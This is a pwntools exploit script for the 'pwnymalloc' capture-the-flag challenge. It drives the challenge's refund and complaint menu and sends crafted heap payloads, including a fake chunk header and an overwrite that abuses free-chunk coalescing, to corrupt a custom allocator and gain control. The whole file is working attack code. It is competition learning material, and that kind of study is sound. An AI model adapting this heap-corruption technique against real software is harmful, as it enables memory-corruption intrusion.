#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal")
context.terminal = ["tmux", "splitw", "-h"]
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
           gdb.attach(r)
    else:
        r = remote("pwnymalloc.chal.uiuc.tf", 1337, ssl=True)

    return r

def request_refund(dollar_amount, reason):
    r.recvuntil("5. Exit\n")
    r.sendline("3")
    r.recvuntil("Please enter the dollar amount you would like refunded:")
    r.sendline(str(dollar_amount))
    r.recvuntil("Please enter the reason for your refund request:")
    r.sendline(reason)

def request_bugged_refund(dollar_amount, reason):
    r.recvuntil("Please enter the dollar amount you would like refunded:")
    r.sendline(str(dollar_amount))
    r.recvuntil("Please enter the reason for your refund request:")
    r.sendline(reason)

def submit_complaint(complaint):
    r.recvuntil("5. Exit\n")
    r.sendline("1")
    r.recvuntil("Please enter your complaint:")
    r.sendline(complaint)

def check_refund_status(idx):
    r.recvuntil("5. Exit\n")
    r.sendline("4")
    r.recvuntil("Please enter your request ID:")
    r.sendline(str(idx))

def main():
    global r
    r = conn()
    
    free_coalesce_payload = b"a" * 0x78 + b"\x10"
    request_refund(100, b"a"*0x7f)
    for i in range(20):
        payload = b"a"*0x7f
        if i == 3:
            payload = p64(0x92) + p64(0)* 15
         
        request_bugged_refund(100, payload)
    
    request_bugged_refund(100, free_coalesce_payload)

    submit_complaint("A"*0x10)
    set_status_payload = b"b" * 0x78 + p32(0x01) + b"\x00"
    request_refund(100, set_status_payload)

    check_refund_status(5)

    r.interactive()


if __name__ == "__main__":
    main()
